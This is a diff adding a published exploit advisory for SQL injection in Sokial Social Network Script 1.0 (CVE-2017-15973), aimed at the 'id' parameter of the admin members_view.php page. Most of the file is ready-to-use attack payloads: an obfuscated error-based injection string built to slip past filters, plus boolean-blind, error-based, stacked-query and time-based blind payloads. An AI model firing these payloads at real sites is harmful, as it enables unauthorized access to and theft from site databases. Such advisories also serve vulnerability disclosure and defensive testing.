@@ -1,0 +1,44 @@
+# # # # # 
+# Exploit Title: Sokial Social Network Script 1.0 - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://www.sokial.net/
+# Software http://www.sokial.net/demonstrations-social-network.sk
+# Demo: http://demo.sokial.net/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15973
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/admin/members_view.php?id=[SQL]
+# 
+# 2271+aND(/*!00033SelEcT*/+0x30783331+/*!00033frOM*/+(/*!00033SelEcT*/+cOUNT(*),/*!00033cOnCaT*/((/*!00033sELECT*/(/*!00033sELECT*/+/*!00033cOnCaT*/(cAST(dATABASE()+aS+/*!00033cHAR*/),0x7e,0x496873616E53656e63616e))+/*!00033FRoM*/+iNFORMATION_sCHEMA.tABLES+/*!00033wHERE*/+tABLE_sCHEMA=dATABASE()+lIMIT+0,1),fLOOR(/*!00033rAND*/(0)*2))x+/*!00033FRoM*/+iNFORMATION_sCHEMA.tABLES+gROUP+bY+x)a)+/*!00033aNd*/+1=1
+# 
+# Parameter: id (GET)
+#     Type: boolean-based blind
+#     Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+#     Payload: id=2271 RLIKE (SELECT (CASE WHEN (8371=8371) THEN 2271 ELSE 0x28 END))
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: id=2271 AND (SELECT 9357 FROM(SELECT COUNT(*),CONCAT(0x7176716a71,(SELECT (ELT(9357=9357,1))),0x717a6b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+# 
+#     Type: stacked queries
+#     Title: MySQL > 5.0.11 stacked queries (comment)
+#     Payload: id=2271;SELECT SLEEP(5)#
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 OR time-based blind
+#     Payload: id=2271 OR SLEEP(5)
+# 	
+# Etc..
+# # # # #
